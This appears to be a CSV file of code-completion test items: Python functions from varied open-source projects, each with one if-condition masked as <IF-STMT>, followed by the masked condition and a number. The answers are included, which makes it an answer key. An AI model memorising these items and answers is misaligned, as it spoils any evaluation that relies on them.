2581,"def validate_vars(env):<tab>""""""Validate the PCH and PCHSTOP construction variables.""""""<tab>if ""PCH"" in env and env[""PCH""]:<tab><tab><IF-STMT><tab><tab><tab>raise SCons.Errors.UserError(<tab><tab><tab><tab>""The PCHSTOP construction must be defined if PCH is defined.""<tab><tab><tab>)<tab><tab>if not SCons.Util.is_String(env[""PCHSTOP""]):<tab><tab><tab>raise SCons.Errors.UserError(<tab><tab><tab><tab>""The PCHSTOP construction variable must be a string: %r""<tab><tab><tab><tab>% env[""PCHSTOP""]<tab><tab><tab>)","if ""PCHSTOP"" not in env :",156
2582,"def page_func(page_num):<tab>playlist = self._call_api(<tab><tab>""product/playlist"",<tab><tab>show_id,<tab><tab>{<tab><tab><tab>""playListId"": playlist_id,<tab><tab><tab>""pageNumber"": page_num,<tab><tab><tab>""pageSize"": 30,<tab><tab><tab>""sorts"": [{""order"": ""DESC"", ""type"": ""SORTDATE""}],<tab><tab>},<tab>)<tab>for product in playlist.get(""productList"", {}).get(""products"", []):<tab><tab>product_url = product.get(""productUrl"", []).get(""url"")<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>yield self.url_result(<tab><tab><tab>product_url, ""Shahid"", str_or_none(product.get(""id"")), product.get(""title"")<tab><tab>)",if not product_url :,196
2583,"def forward(self, x):<tab>for rproj, conv in zip(self.residual_proj, self.conv_layers):<tab><tab>residual = x<tab><tab>x = conv(x)<tab><tab>if self.skip_connections:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>residual = rproj(residual)<tab><tab><tab>x = (x + residual) * self.residual_scale<tab>return x",if rproj is not None :,104
2584,"def _make_results_dir(self):<tab>r""""""Makes directory for saving eqa-cnn-pretrain eval results.""""""<tab>for s_type in [""rgb"", ""seg"", ""depth""]:<tab><tab>dir_name = self.config.RESULTS_DIR.format(split=""val"", type=s_type)<tab><tab><IF-STMT><tab><tab><tab>os.makedirs(dir_name)",if not os . path . isdir ( dir_name ) :,99
2585,"def ignore_callback_errors(self, ignore):<tab>EventEmitter.ignore_callback_errors.fset(self, ignore)<tab>for emitter in self._emitters.values():<tab><tab>if isinstance(emitter, EventEmitter):<tab><tab><tab>emitter.ignore_callback_errors = ignore<tab><tab><IF-STMT><tab><tab><tab>emitter.ignore_callback_errors_all(ignore)","elif isinstance ( emitter , EmitterGroup ) :",95
2586,"def cron_starter(*args: Any) -> None:<tab>_tz = self.conf.timezone if timezone is None else timezone<tab>while not self.should_stop:<tab><tab>await self.sleep(cron.secs_for_next(cron_format, _tz))<tab><tab><IF-STMT><tab><tab><tab>should_run = not on_leader or self.is_leader()<tab><tab><tab>if should_run:<tab><tab><tab><tab>with self.trace(shortlabel(fun), trace_enabled=traced):<tab><tab><tab><tab><tab>await fun(*args)",if not self . should_stop :,139
2587,def rotateafter(self):<tab>if self.i != self.previ:<tab><tab>i = self.parent.l.GetSelection()<tab><tab><IF-STMT><tab><tab><tab>self.parent.models[self.parent.l.GetString(i)].rot -= 5 * (<tab><tab><tab><tab>self.i - self.previ<tab><tab><tab>)<tab><tab>self.previ = self.i<tab><tab>self.Refresh(),if i != wx . NOT_FOUND :,106
2588,"def select(model, path, iter_, paths_):<tab>(paths, first) = paths_<tab>value = model.get_value(iter_)<tab>if value is None:<tab><tab>return not bool(paths)<tab>value = normalize_path(value)<tab>if value in paths:<tab><tab>self.get_child().get_selection().select_path(path)<tab><tab>paths.remove(value)<tab><tab>if not first:<tab><tab><tab>self.get_child().set_cursor(path)<tab><tab><tab># copy treepath, gets invalid after the callback<tab><tab><tab>first.append(path.copy())<tab>else:<tab><tab>for fpath in paths:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.get_child().expand_row(path, False)<tab>return not bool(paths)",if fpath . startswith ( value ) :,194
2589,"def read_logs_file(logs_path) -> List[V1Log]:<tab>if not os.path.exists(logs_path):<tab><tab>return []<tab>async with aiofiles.open(logs_path, mode=""r"") as f:<tab><tab>contents = await f.read()<tab><tab>if contents:<tab><tab><tab># Version handling<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return V1Logs.read_csv(contents).logs<tab><tab><tab># Legacy logs<tab><tab><tab>logs = V1Logs.read(contents)<tab><tab><tab>return logs.logs<tab>return []","if "".plx"" in logs_path :",145
2590,"def adjust_sockets(self):<tab>variables = self.get_variables()<tab>for key in self.inputs.keys():<tab><tab><IF-STMT><tab><tab><tab>self.debug(<tab><tab><tab><tab>""Input {} not in variables {}, remove it"".format(key, str(variables))<tab><tab><tab>)<tab><tab><tab>self.inputs.remove(self.inputs[key])<tab>for v in variables:<tab><tab>if v not in self.inputs:<tab><tab><tab>self.debug(<tab><tab><tab><tab>""Variable {} not in inputs {}, add it"".format(<tab><tab><tab><tab><tab>v, str(self.inputs.keys())<tab><tab><tab><tab>)<tab><tab><tab>)<tab><tab><tab>self.inputs.new(""SvStringsSocket"", v)","if key not in variables and key not in [ ""Field"" ] :",183
2591,"def run(self):<tab>while self.running:<tab><tab>cmd = self.cmds.get()<tab><tab><IF-STMT><tab><tab><tab>break<tab><tab>elif cmd == ""clear"":<tab><tab><tab>dead_tasks = []<tab><tab><tab>for task in self.tasks:<tab><tab><tab><tab>if task.status == Task.FINISH or task.status == Task.ERROR:<tab><tab><tab><tab><tab>dead_tasks.append(task)<tab><tab><tab>for dead_task in dead_tasks:<tab><tab><tab><tab>self.tasks.remove(dead_task)","if cmd == ""stop"" :",131
2592,"def process(self, node):<tab>self.vars = []<tab>for child in node.childNodes:<tab><tab>if child.nodeType == node.ELEMENT_NODE:<tab><tab><tab>child_text = get_xml_text(child)<tab><tab><tab>if child_text == """":  # pragma:nocover<tab><tab><tab><tab>continue<tab><tab><tab><IF-STMT><tab><tab><tab><tab>for val in re.split(""[\t ]+"", child_text):<tab><tab><tab><tab><tab>self.vars.append(1.0 * eval(val))<tab>return self","if child . nodeName == ""Real"" :",135
2593,"def drain(self, fd):<tab>""""""Make `fd` unreadable.""""""<tab>while True:<tab><tab>try:<tab><tab><tab>if not os.read(fd, 4096):<tab><tab><tab><tab>return<tab><tab>except OSError:<tab><tab><tab>e = sys.exc_info()[1]<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return<tab><tab><tab>raise",if e . args [ 0 ] == errno . EAGAIN :,97
2594,"def parse(s):<tab>""""""Parse the output below to create a new StopWatch.""""""<tab>stopwatch = StopWatch()<tab>for line in s.splitlines():<tab><tab><IF-STMT><tab><tab><tab>parts = line.split(None)<tab><tab><tab>name = parts[0]<tab><tab><tab>if name != ""%"":  # ie not the header line<tab><tab><tab><tab>rest = (float(v) for v in parts[2:])<tab><tab><tab><tab>stopwatch.times[parts[0]].merge(Stat.build(*rest))<tab>return stopwatch",if line . strip ( ) :,128
2595,"def delete(identifier, filenames=None, **kwargs):<tab>item = get_item(identifier)<tab>if filenames:<tab><tab><IF-STMT><tab><tab><tab>filenames = [filenames]<tab><tab>for f in item.iter_files():<tab><tab><tab>if f.name not in filenames:<tab><tab><tab><tab>continue<tab><tab><tab>f.delete(**kwargs)","if not isinstance ( filenames , ( set , list ) ) :",91
2596,"def _get_absolute_timeout(self, timeout):<tab>if timeout is Timeout.DEFAULT_TIMEOUT:<tab><tab>return 5  # 5s is the default timeout for URLFetch.<tab>if isinstance(timeout, Timeout):<tab><tab><IF-STMT><tab><tab><tab>warnings.warn(<tab><tab><tab><tab>""URLFetch does not support granular timeout settings, ""<tab><tab><tab><tab>""reverting to total timeout."",<tab><tab><tab><tab>AppEnginePlatformWarning,<tab><tab><tab>)<tab><tab>return timeout.total<tab>return timeout",if timeout . read is not timeout . connect :,124
2597,"def _add_annotation_to_imports(<tab>self, annotation: cst.Attribute) -> Union[cst.Name, cst.Attribute]:<tab>key = get_full_name_for_node(annotation.value)<tab>if key is not None:<tab><tab># Don't attempt to re-import existing imports.<tab><tab>if key in self.existing_imports:<tab><tab><tab>return annotation<tab><tab>import_name = get_full_name_for_node(annotation.attr)<tab><tab><IF-STMT><tab><tab><tab>AddImportsVisitor.add_needed_import(self.context, key, import_name)<tab>return annotation.attr",if import_name is not None :,156
2598,"def unique_definitions(cls, defns):<tab>""""""Takes a collection of defns and returns the unique list of defns.""""""<tab>unique_defns = []<tab>for defn in defns:<tab><tab>for unique_defn in unique_defns:<tab><tab><tab><IF-STMT><tab><tab><tab><tab># defn is already in the unique_defn list.<tab><tab><tab><tab>break<tab><tab>else:<tab><tab><tab>unique_defns.append(defn)<tab>return unique_defns",if unique_defn . path == defn . path and unique_defn == defn :,126
2599,"def store_data(self, store_loc, **kwargs):<tab>""""""Put arrays to store""""""<tab># print(store_loc)<tab>g = self.store.create_group(store_loc)<tab>for (<tab><tab>k,<tab><tab>v,<tab>) in kwargs.items():<tab><tab># print(type(v[0]))<tab><tab># print(k)<tab><tab><IF-STMT><tab><tab><tab>if len(v) != 0:<tab><tab><tab><tab>if type(v[0]) is np.str_ or type(v[0]) is str:<tab><tab><tab><tab><tab>v = [a.encode(""utf8"") for a in v]<tab><tab>g.create_dataset(k, data=v, compression=self.clib, compression_opts=self.clev)",if type ( v ) == list :,191
2600,"def connect_to_uri(self, uri, autoconnect=None, do_start=True):<tab>try:<tab><tab>conn = self._check_conn(uri)<tab><tab>if not conn:<tab><tab><tab># Unknown connection, add it<tab><tab><tab>conn = self.add_conn(uri)<tab><tab><IF-STMT><tab><tab><tab>conn.set_autoconnect(bool(autoconnect))<tab><tab>self.show_manager()<tab><tab>if do_start:<tab><tab><tab>conn.open()<tab><tab>return conn<tab>except Exception:<tab><tab>logging.exception(""Error connecting to %s"", uri)<tab><tab>return None",if autoconnect is not None :,152
2601,"def fn(n):<tab>while n < 3:<tab><tab>if n < 0:<tab><tab><tab>yield ""less than zero""<tab><tab><IF-STMT><tab><tab><tab>yield ""zero""<tab><tab>elif n == 1:<tab><tab><tab>yield ""one""<tab><tab>else:<tab><tab><tab>yield ""more than one""<tab><tab>n += 1",elif n == 0 :,84
2602,"def closeEvent(self, e):<tab>self.common.log(""MainWindow"", ""closeEvent"")<tab>if self.tabs.are_tabs_active():<tab><tab># Open the warning dialog<tab><tab>self.common.log(""MainWindow"", ""closeEvent, opening warning dialog"")<tab><tab>self.close_dialog.exec_()<tab><tab># Close<tab><tab><IF-STMT><tab><tab><tab>self.system_tray.hide()<tab><tab><tab>e.accept()<tab><tab># Cancel<tab><tab>else:<tab><tab><tab>e.ignore()<tab><tab>return<tab>self.system_tray.hide()<tab>e.accept()",if self . close_dialog . clickedButton ( ) == self . close_dialog . accept_button :,165
2603,"def _stop_child_activities(self, name=None):<tab>""""""Stop all child activities spawn by this activity.""""""<tab># Makes a list copy of items() to avoid dictionary size changed<tab># during iteration<tab>for child_name, child in list(self._child_activity_map.items()):<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>LOG.debug(""%s: Stopping child activity %s "", self.name, child_name)<tab><tab>if child.started:<tab><tab><tab>child.stop()<tab><tab>self._child_activity_map.pop(child_name, None)",if name is not None and name != child_name :,150
2604,"def add_libdirs(self, envvar, sep, fatal=False):<tab>v = os.environ.get(envvar)<tab>if not v:<tab><tab>return<tab>for dir in str.split(v, sep):<tab><tab>dir = str.strip(dir)<tab><tab>if not dir:<tab><tab><tab>continue<tab><tab>dir = os.path.normpath(dir)<tab><tab>if os.path.isdir(dir):<tab><tab><tab>if not dir in self.library_dirs:<tab><tab><tab><tab>self.library_dirs.append(dir)<tab><tab><IF-STMT><tab><tab><tab>fail(""FATAL: bad directory %s in environment variable %s"" % (dir, envvar))",elif fatal :,159
2605,"def _serialize_list(array, previous):<tab>array = array or []<tab>previous = previous or []<tab>params = {}<tab>for i, v in enumerate(array):<tab><tab>previous_item = previous[i] if len(previous) > i else None<tab><tab><IF-STMT><tab><tab><tab>params[str(i)] = v.serialize(previous_item)<tab><tab>else:<tab><tab><tab>params[str(i)] = _compute_diff(v, previous_item)<tab>return params","if hasattr ( v , ""serialize"" ) :",122
2606,"def list_bucket(self, prefix="""", delimiter="""", headers=None, all_versions=False):<tab>self._check_bucket_uri(""list_bucket"")<tab>bucket = self.get_bucket(headers=headers)<tab>if all_versions:<tab><tab>return (<tab><tab><tab>v<tab><tab><tab>for v in bucket.list_versions(<tab><tab><tab><tab>prefix=prefix, delimiter=delimiter, headers=headers<tab><tab><tab>)<tab><tab><tab><IF-STMT><tab><tab>)<tab>else:<tab><tab>return bucket.list(prefix=prefix, delimiter=delimiter, headers=headers)","if not isinstance ( v , DeleteMarker )",142
2607,"def writeattr(stream, text):<tab>countdouble = text.count('""')<tab>if countdouble:<tab><tab>countsingle = text.count(""'"")<tab><tab><IF-STMT><tab><tab><tab>entities = {'""': ""&quot;""}<tab><tab><tab>quote = '""'<tab><tab>else:<tab><tab><tab>entities = {""'"": ""&apos;""}<tab><tab><tab>quote = ""'""<tab>else:<tab><tab>entities = {}<tab><tab>quote = '""'<tab>stream.write(quote)<tab>writetext(stream, text, entities)<tab>stream.write(quote)",if countdouble <= countsingle :,133
2608,"def __gt__(self, other):<tab>if not isinstance(other, self.__class__):<tab><tab>other = self.__class__(other)<tab>for part, value in self.parts:<tab><tab>other_value = other[part]<tab><tab>if part in LETTERS:<tab><tab><tab>cmp = self._cmp_part(value or ""z"", other_value or ""z"")<tab><tab>else:<tab><tab><tab>cmp = self._cmp_part(value, other_value)<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>else:<tab><tab><tab>return cmp == 1<tab>return False",if cmp == 0 :,141
2609,"def _concretize(self, n_cls, t1, t2, join_or_meet, translate):<tab>ptr_class = self._pointer_class()<tab>if n_cls is ptr_class:<tab><tab>if isinstance(t1, ptr_class) and isinstance(t2, ptr_class):<tab><tab><tab># we need to merge them<tab><tab><tab>return ptr_class(join_or_meet(t1.basetype, t2.basetype, translate))<tab><tab><IF-STMT><tab><tab><tab>return t1<tab><tab>elif isinstance(t2, ptr_class):<tab><tab><tab>return t2<tab><tab>else:<tab><tab><tab># huh?<tab><tab><tab>return ptr_class(BottomType())<tab>return n_cls()","if isinstance ( t1 , ptr_class ) :",181
2610,"def __init__(self, items=None):<tab>super().__init__()<tab>self.include_dirs = []<tab>self._add_member(""src_files"", FileList, ""C source files for VPI library"")<tab>self._add_member(""include_files"", FileList, ""C include files for VPI library"")<tab>self._add_member(<tab><tab>""libs"", StringList, ""External libraries linked with the VPI library""<tab>)<tab>if items:<tab><tab>self.load_dict(items)<tab><tab><IF-STMT><tab><tab><tab>self.include_dirs += unique_dirs(self.include_files)<tab><tab>self.export_files = self.src_files + self.include_files",if self . include_files :,171
2611,"def __init__(self, parent_element):<tab>if parent_element.items():<tab><tab>self.update(dict(parent_element.items()))<tab>for element in parent_element:<tab><tab>if len(element) > 0:<tab><tab><tab>if element.tag == element[0].tag:<tab><tab><tab><tab>aDict = ListParser(element)<tab><tab><tab>else:<tab><tab><tab><tab>aDict = DictParser(element)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>aDict.update(dict(element.items()))<tab><tab><tab>self.update({element.tag: aDict})<tab><tab>elif element.items():<tab><tab><tab>self.update({element.tag: dict(element.items())})<tab><tab>else:<tab><tab><tab>self.update({element.tag: element.text})",if element . items ( ) :,190
2612,"def _shares_in_results(data):<tab>shares_in_device, shares_in_subdevice = False, False<tab>for plugin_name, plugin_result in data.iteritems():<tab><tab>if plugin_result[""status""] == ""error"":<tab><tab><tab>continue<tab><tab>if ""device"" not in plugin_result:<tab><tab><tab>continue<tab><tab>if ""disk_shares"" in plugin_result[""device""]:<tab><tab><tab>shares_in_device = True<tab><tab>for subdevice in plugin_result[""device""].get(""subdevices"", []):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>shares_in_subdevice = True<tab><tab><tab><tab>break<tab>return shares_in_device, shares_in_subdevice","if ""disk_shares"" in subdevice :",175
2613,"def decorator(self, command, *args, **kwargs):<tab>if required_keys:<tab><tab>missing_keys = diff_keys(required_keys, command)<tab><tab><IF-STMT><tab><tab><tab>raise InvalidCommand(<tab><tab><tab><tab>""Command missing %s of required""<tab><tab><tab><tab>"" keys %s"" % (missing_keys, required_keys)<tab><tab><tab>)<tab>return func(self, command, *args, **kwargs)",if missing_keys :,107
2614,"def xml(self):<tab>out = [""<spreadsheet>""]<tab>for (x, y), cell in self.cells.items():<tab><tab><IF-STMT><tab><tab><tab>cellxml = cell.xml()<tab><tab>else:<tab><tab><tab>cellxml = ""<value>%s</value>"" % escape(cell)<tab><tab>out.append('<cell row=""%s"" col=""%s"">\n  %s\n</cell>' % (y, x, cellxml))<tab>out.append(""</spreadsheet>"")<tab>return ""\n"".join(out)","if hasattr ( cell , ""xml"" ) :",127
2615,"def speed_tester_d(self, uid):<tab>if uid not in self._speed_tester_d:<tab><tab><IF-STMT>  # TODO<tab><tab><tab>self._speed_tester_d[uid] = SpeedTester(<tab><tab><tab><tab>self._config.get(""speed_limit_per_user"", 0)<tab><tab><tab>)<tab><tab>else:<tab><tab><tab>self._speed_tester_d[uid] = SpeedTester(<tab><tab><tab><tab>self._config.get(""speed_limit_per_user"", 0)<tab><tab><tab>)<tab>return self._speed_tester_d[uid]",if self . mu :,143
2616,"def process_error(self, data):<tab>error = data.get(""error"")<tab>if error:<tab><tab><IF-STMT><tab><tab><tab>raise AuthCanceled(self)<tab><tab>else:<tab><tab><tab>raise AuthUnknownError(self, ""Jawbone error was {0}"".format(error))<tab>return super().process_error(data)","if error == ""access_denied"" :",86
2617,"def _do_test_fetch_result(self, results, remote):<tab># self._print_fetchhead(remote.repo)<tab>self.assertGreater(len(results), 0)<tab>self.assertIsInstance(results[0], FetchInfo)<tab>for info in results:<tab><tab>self.assertIsInstance(info.note, string_types)<tab><tab><IF-STMT><tab><tab><tab>self.assertTrue(info.flags)<tab><tab># END reference type flags handling<tab><tab>self.assertIsInstance(info.ref, (SymbolicReference, Reference))<tab><tab>if info.flags & (info.FORCED_UPDATE | info.FAST_FORWARD):<tab><tab><tab>self.assertIsInstance(info.old_commit, Commit)<tab><tab>else:<tab><tab><tab>self.assertIsNone(info.old_commit)","if isinstance ( info . ref , Reference ) :",186
2618,"def init_ftp_server(self):<tab>if self.get_config(""ftpd"", ""enabled"", False, boolean=True):<tab><tab>accountfile = from_utf8_or_none(self.get_config(""ftpd"", ""accounts.file"", None))<tab><tab><IF-STMT><tab><tab><tab>accountfile = abspath_expanduser_unicode(accountfile, base=self.basedir)<tab><tab>accounturl = self.get_config(""ftpd"", ""accounts.url"", None)<tab><tab>ftp_portstr = self.get_config(""ftpd"", ""port"", ""8021"")<tab><tab>from allmydata.frontends import ftpd<tab><tab>s = ftpd.FTPServer(self, accountfile, accounturl, ftp_portstr)<tab><tab>s.setServiceParent(self)",if accountfile :,190
2619,"def configured_request_log_handlers(config, prefix=""query_log"", default_logger=None):<tab>""""""Returns configured query loggers as defined in the `config`.""""""<tab>handlers = []<tab>for section in config.sections():<tab><tab>if section.startswith(prefix):<tab><tab><tab>options = dict(config.items(section))<tab><tab><tab>type_ = options.pop(""type"")<tab><tab><tab><IF-STMT><tab><tab><tab><tab>logger = default_logger or get_logger()<tab><tab><tab><tab>handler = ext.request_log_handler(""default"", logger)<tab><tab><tab>else:<tab><tab><tab><tab>handler = ext.request_log_handler(type_, **options)<tab><tab><tab>handlers.append(handler)<tab>return handlers","if type_ == ""default"" :",174
2620,"def string(self):<tab>""""""Returns a PlayString in string format from the Patterns values""""""<tab>string = """"<tab>for item in self.data:<tab><tab>if isinstance(item, (PGroup, GeneratorPattern)):<tab><tab><tab>string += item.string()<tab><tab><IF-STMT><tab><tab><tab>string += (<tab><tab><tab><tab>""(""<tab><tab><tab><tab>+ """".join(<tab><tab><tab><tab><tab>[<tab><tab><tab><tab><tab><tab>(s.string() if hasattr(s, ""string"") else str(s))<tab><tab><tab><tab><tab><tab>for s in item.data<tab><tab><tab><tab><tab>]<tab><tab><tab><tab>)<tab><tab><tab><tab>+ "")""<tab><tab><tab>)<tab><tab>else:<tab><tab><tab>string += str(item)<tab>return string","elif isinstance ( item , Pattern ) :",183
2621,"def locked_deps(package, poetry):<tab>reqs = []<tab>packages = poetry.locker.locked_repository(False).packages<tab>for p in packages:<tab><tab>dep = p.to_dependency()<tab><tab>line = ""{}=={}"".format(p.name, p.version)<tab><tab>requirement = dep.to_pep_508()<tab><tab><IF-STMT><tab><tab><tab>line += ""; {}"".format(requirement.split("";"")[1].strip())<tab><tab>reqs.append(line)<tab>return reqs, defaultdict(list)","if "";"" in requirement :",132
2622,"def _paste_columns(self, topleft_corner, columns):<tab>starting_column = topleft_corner[1]<tab>number_of_columns = self.number_of_columns()<tab>for index, column in enumerate(columns):<tab><tab>set_index = starting_column + index<tab><tab><IF-STMT><tab><tab><tab>self.set_column_at(set_index, column, starting=topleft_corner[0])<tab><tab>else:<tab><tab><tab>real_column = [constants.DEFAULT_NA] * topleft_corner[0]<tab><tab><tab>real_column += column<tab><tab><tab>self.extend_columns([real_column])<tab>self.__width, self.__array = uniform(self.__array)",if set_index < number_of_columns :,172
2623,"def check_objects_exist(self, compare_id, raise_exc=True):<tab>for uid in convert_compare_id_to_list(compare_id):<tab><tab>if not self.existence_quick_check(uid):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>raise FactCompareException(""{} not found in database"".format(uid))<tab><tab><tab>return True<tab>return False",if raise_exc :,94
2624,"def __add__(self, other):<tab>if hasattr(other, ""unit_type""):<tab><tab><IF-STMT><tab><tab><tab>raise UnitError(""Adding different types of units is"" "" not allowed"")<tab><tab>if other.unit != self.unit:<tab><tab><tab>other = other.to(self.unit)<tab>return self.__class__(<tab><tab>np.array(self) + np.array(other), unit_type=self.unit_type, unit=self.unit<tab>)",if other . unit_type != self . unit_type :,123
2625,"def extract(self, tar):<tab>max_nb = maxNbFile(self)<tab>for index, field in enumerate(tar.array(""file"")):<tab><tab><IF-STMT><tab><tab><tab>self.warning(<tab><tab><tab><tab>""TAR archive contains many files, but only first %s files are processed""<tab><tab><tab><tab>% max_nb<tab><tab><tab>)<tab><tab><tab>break<tab><tab>meta = Metadata(self)<tab><tab>self.extractFile(field, meta)<tab><tab>if meta.has(""filename""):<tab><tab><tab>title = _('File ""%s""') % meta.getText(""filename"")<tab><tab>else:<tab><tab><tab>title = _(""File"")<tab><tab>self.addGroup(field.name, meta, title)",if max_nb is not None and max_nb <= index :,180
2626,"def task_management_menu(activation, request):<tab>""""""Available tasks actions.""""""<tab>actions = []<tab>if request.user.has_perm(activation.flow_class._meta.manage_permission_name):<tab><tab>for transition in activation.get_available_transitions():<tab><tab><tab><IF-STMT><tab><tab><tab><tab>url = activation.flow_task.get_task_url(<tab><tab><tab><tab><tab>activation.task,<tab><tab><tab><tab><tab>transition.name,<tab><tab><tab><tab><tab>user=request.user,<tab><tab><tab><tab><tab>namespace=request.resolver_match.namespace,<tab><tab><tab><tab>)<tab><tab><tab><tab>if url:<tab><tab><tab><tab><tab>actions.append((transition.name.replace(""_"", "" "").title(), url))<tab>return {""actions"": actions, ""request"": request}",if transition . can_proceed ( activation ) :,192
2627,"def handle_default_mac_address(facts):<tab>for suffix in ("""", ""_eth0"", ""_igb0"", ""_bnx0"", ""_bge0"", ""_nfo0"", ""_nge0""):<tab><tab>mac = facts.get(""macaddress{}"".format(suffix))<tab><tab>if mac:<tab><tab><tab>try:<tab><tab><tab><tab>result = MACAddressField.normalize(mac)<tab><tab><tab>except ValueError:<tab><tab><tab><tab>continue<tab><tab><tab><IF-STMT><tab><tab><tab><tab>continue<tab><tab><tab>return result",if result [ : 6 ] in MAC_PREFIX_BLACKLIST :,131
2628,"def run(self):<tab>consumer = KafkaConsumer(<tab><tab>bootstrap_servers=""localhost:9092"", auto_offset_reset=""earliest""<tab>)<tab>consumer.subscribe([""my-topic""])<tab>self.valid = 0<tab>self.invalid = 0<tab>for message in consumer:<tab><tab><IF-STMT><tab><tab><tab>self.valid += 1<tab><tab>else:<tab><tab><tab>self.invalid += 1<tab><tab>if consumer_stop.is_set():<tab><tab><tab>break<tab>consumer.close()",if len ( message . value ) == msg_size :,136
2629,"def createFields(self, fields):<tab>self.destroyFields()<tab>for name, label, args in fields:<tab><tab>kwargs = dict(validator=_TransferValidator(name))<tab><tab><IF-STMT><tab><tab><tab>kwargs.update(args)<tab><tab>stxt = wx.StaticText(self, -1, label)<tab><tab>txt = wx.TextCtrl(self, **kwargs)<tab><tab>self._contentSizer.Add(stxt, 0, wx.ALIGN_CENTER_VERTICAL | wx.ALIGN_RIGHT)<tab><tab>self._contentSizer.Add(txt, 0, wx.EXPAND)<tab><tab>self.__dict__[name] = """"<tab><tab>self._fields[name] = (stxt, txt)",if args :,162
2630,def poll_kafka(self):<tab>while True:<tab><tab>val = self.do_poll()<tab><tab>if val:<tab><tab><tab>yield self._emit(val)<tab><tab>else:<tab><tab><tab>yield gen.sleep(self.poll_interval)<tab><tab><IF-STMT><tab><tab><tab>break<tab>self._close_consumer(),if self . stopped :,85
2631,"def _generate_toc(line):<tab>while 1:<tab><tab>if line.startswith(""2""):<tab><tab><tab>line = 5<tab><tab><tab>while 1:<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>line = 6<tab><tab><tab><tab><tab>break<tab><tab><tab><tab>elif not line:<tab><tab><tab><tab><tab>line = 7<tab><tab><tab><tab><tab>break<tab><tab>elif not line:<tab><tab><tab>break<tab>return 1",if line :,103
2632,"def find_script(scriptId_or_file_or_url):<tab># sha = hashlib.sha1(scriptId_or_file_or_url.encode('utf-8')).hexdigest()<tab>for item in file_to_scriptId:<tab><tab>if item[""scriptId""].lower() == scriptId_or_file_or_url.lower():<tab><tab><tab>return item[""file""]<tab><tab><IF-STMT><tab><tab><tab>return item[""scriptId""]<tab><tab>if item[""url""].lower() == scriptId_or_file_or_url.lower():<tab><tab><tab>return item[""scriptId""]<tab>return None","if item [ ""file"" ] . lower ( ) == scriptId_or_file_or_url . lower ( ) :",165
2633,"def __get_impute_number(some_data):<tab>impute_num_list = None<tab>data_size = None<tab>for line in some_data:<tab><tab>processed_data = line[1][0]<tab><tab>index_list = line[1][1]<tab><tab><IF-STMT><tab><tab><tab>data_size = len(processed_data)<tab><tab><tab># data_size + 1, the last element of impute_num_list used to count the number of ""some_data""<tab><tab><tab>impute_num_list = [0 for _ in range(data_size + 1)]<tab><tab>impute_num_list[data_size] += 1<tab><tab>for index in index_list:<tab><tab><tab>impute_num_list[index] += 1<tab>return np.array(impute_num_list)",if not data_size :,200
2634,"def get_shipping_address(self):<tab>""""""Returns Address object from shipping address fields if present""""""<tab># shipping address fields can be `shipping_address_name` or `shipping_address`<tab># try getting value from both<tab>for fieldname in (""shipping_address_name"", ""shipping_address""):<tab><tab>shipping_field = self.meta.get_field(fieldname)<tab><tab>if shipping_field and shipping_field.fieldtype == ""Link"":<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return frappe.get_doc(""Address"", self.get(fieldname))<tab>return {}",if self . get ( fieldname ) :,141
2635,"def _get_spawn_property(self, constraints, constraint_name, services):<tab>if services:<tab><tab># this isn't very nice<tab><tab><IF-STMT><tab><tab><tab>return services[0].image<tab><tab>elif constraint_name == CPUS_CONSTRAINT:<tab><tab><tab>return services[0].cpus<tab>for constraint in constraints:<tab><tab>if constraint.name == constraint_name:<tab><tab><tab>return constraint.value<tab>return None",if constraint_name == IMAGE_CONSTRAINT :,113
2636,"def latest_extra_data(self, extra_dirs=None):<tab>base_name = os.path.splitext(os.path.basename(self.file_name))[0]<tab>extra_dirs.append(self.board.GetPlotOptions().GetOutputDirectory())<tab>file_dir_name = os.path.dirname(self.file_name)<tab>directories = [<tab><tab>file_dir_name,<tab>]<tab>for dir in extra_dirs:<tab><tab>if not os.path.isabs(dir):<tab><tab><tab>dir = os.path.join(file_dir_name, dir)<tab><tab><IF-STMT><tab><tab><tab>directories.append(dir)<tab>return find_latest_schematic_data(base_name, directories)",if os . path . exists ( dir ) :,181
2637,"def _checkForLeftRightModifiers(cls, mod_state):<tab>mod_value = 0<tab>mod_strs = []<tab>for k, v in cls._OS_MODIFIERS:<tab><tab><IF-STMT><tab><tab><tab>mod_value += KeyboardConstants._modifierCodes.getID(v)<tab><tab><tab>mod_strs.append(modifier_name_mappings.get(v, ""MISSING_MOD_NAME""))<tab>return mod_value, mod_strs",if mod_state & k > 0 :,116
2638,"def _decode_pattern_list(data):<tab>rv = []<tab>contains_dict = False<tab>for item in data:<tab><tab><IF-STMT><tab><tab><tab>item = _decode_pattern_list(item)<tab><tab>elif isinstance(item, dict):<tab><tab><tab>item = _decode_pattern_dict(item)<tab><tab><tab>contains_dict = True<tab><tab>rv.append(item)<tab># avoid sorting if any element in the list is a dict<tab>if not contains_dict:<tab><tab>rv = sorted(rv)<tab>return rv","if isinstance ( item , list ) :",133
2639,"def get_blob(self, blobname, ctlr=None, specific_dir=None):<tab>self._acquire_lock()<tab>try:<tab><tab>dbsubpath = self._dbsubpath_from_blobname(<tab><tab><tab>blobname, ctlr=ctlr, specific_dir=specific_dir<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>return self.lang_zone.load_blob(dbsubpath)<tab><tab>else:<tab><tab><tab>return None<tab>finally:<tab><tab>self._release_lock()",if dbsubpath is not None :,126
2640,"def get_tasks(self):<tab>for task in asyncio.all_tasks(loop=self.middleware.loop):<tab><tab>formatted = None<tab><tab>frame = None<tab><tab>frames = []<tab><tab>for frame in task.get_stack():<tab><tab><tab>cur_frame = get_frame_details(frame, self.logger)<tab><tab><tab>if cur_frame:<tab><tab><tab><tab>frames.append(cur_frame)<tab><tab><IF-STMT><tab><tab><tab>formatted = traceback.format_stack(frame)<tab><tab>yield {<tab><tab><tab>""stack"": formatted,<tab><tab><tab>""frames"": frames,<tab><tab>}",if frame :,146
